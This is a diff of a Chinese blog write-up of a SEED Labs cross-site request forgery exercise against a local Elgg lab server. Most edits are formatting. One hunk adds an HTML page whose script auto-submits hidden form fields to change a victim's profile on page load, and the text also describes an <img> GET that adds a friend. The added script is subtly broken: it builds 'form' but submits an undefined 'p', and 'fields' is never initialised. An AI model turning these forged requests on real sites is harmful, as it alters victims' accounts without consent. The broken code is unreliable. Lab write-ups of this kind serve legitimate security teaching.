@@ -18,20 +18,20 @@ copyrights: 原创
 
 在客户机和服务器之间进行请求-响应时，两种最常被用到的方法是 GET 和 POST。
 
-- **GET** - 从指定的资源请求数据
-- **POST** - 向指定的资源提交要被处理的数据
+- ***GET*** - 从指定的资源请求数据
+- ***POST*** - 向指定的资源提交要被处理的数据
 
 ## Task 1: Observing HTTP Request
 
 修改 `/etc/hosts`
 
-```bash
+```shell
 sudo vim /etc/hosts
 ```
 
 更改为
 
-```hosts
+```plaintext
 10.9.0.5 www.seed-server.com
 10.9.0.5 www.example32.com
 10.9.0.105 www.attacker32.com
@@ -39,7 +39,7 @@ sudo vim /etc/hosts
 
 然后启动 docker
 
-```bash
+```shell
 dcbuild
 dcup
 ```
@@ -58,7 +58,7 @@ dcup
 
 ![csrf2](/assets/post/images/csrf2.webp)
 
-可以看到加好友的方法为 GET， url 为 `http://www.seed-server.com/action/friends/add?friend=user id&cookie等`。这里 user id 就是 Alice 的 id。要想让 Alice 加自己，就需要知道自己的 id。
+可以看到加好友的方法为 `GET`， url 为 `http://www.seed-server.com/action/friends/add?friend=user id&cookie等`。这里 user id 就是 Alice 的 id。要想让 Alice 加自己，就需要知道自己的 id。
 
 去往 members 页面，<kbd>F12</kbd>查看列表，可以看到用户 id 都被直接明文存储了。
 
@@ -72,7 +72,7 @@ dcup
 
 ![csrf4](/assets/post/images/csrf4.webp)
 
-`<img>`会自动发送 GET 请求。现在登录 Alice 的账号，点进 Samy 的个人资料，可以看到，已经自动加了好友。
+`<img>`会自动发送 `GET` 请求。现在登录 Alice 的账号，点进 Samy 的个人资料，可以看到，已经自动加了好友。
 
 ![csrf5](/assets/post/images/csrf5.webp)
 
@@ -82,11 +82,48 @@ dcup
 
 ![csrf6](/assets/post/images/csrf6.webp)
 
-可以看到修改 profile 方法为 POST，url 为 [http://www.seed-server.com/action/profile/edit](http://www.seed-server.com/action/profile/edit)
+可以看到修改 profile 方法为 `POST`，url 为 [http://www.seed-server.com/action/profile/edit](http://www.seed-server.com/action/profile/edit)
 
-我们要整一个网页来执行我们的 javasrcipt，编辑 editprofile.html
+我们要整一个网页来执行我们的 javasrcipt，编辑 `editprofile.html`
 
-<img src="/assets/post/images/csrf7.webp" alt="csrf7" style="zoom:50%;" />
+```html
+<html>
+<body>
+<h1>This page forges an HTTP POST request.</h1>
+<script type="text/javascript">
+
+function forge_post()
+{
+    var fields;
+
+    // The following are form entries need to be filled out by attackers.
+    // The entries are made hidden, so the victim won't be able to see them.
+    fields += "<input type='hidden' name='name' value='Alice'>";
+    fields += "<input type='hidden' name='briefdescription' value='Samy is my hero'>";
+    fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";
+    fields += "<input type='hidden' name='guid' value='56'>";
+
+    // Create a <form> element
+    var form = document.createElement("form");
+
+    // Construct the form
+    p.action = "http://www.seed-server.com/action/profile/edit";
+    p.innerHTML = fields;
+    p.method = "POST";
+
+    // Append the form to the current page.
+    document.body.appendChild(p);
+
+    // Submit the form
+    p.submit();
+}
+
+// Invoke forge_post() after the page is loaded.
+window.onload = function() { forge_post(); }
+</script>
+</body>
+</html>
+```
 
 然后修改 profile 如下所示，并添加 [www.attacker32.com/editprofile.html](www.attacker32.com/editprofile.html) 的链接。
 
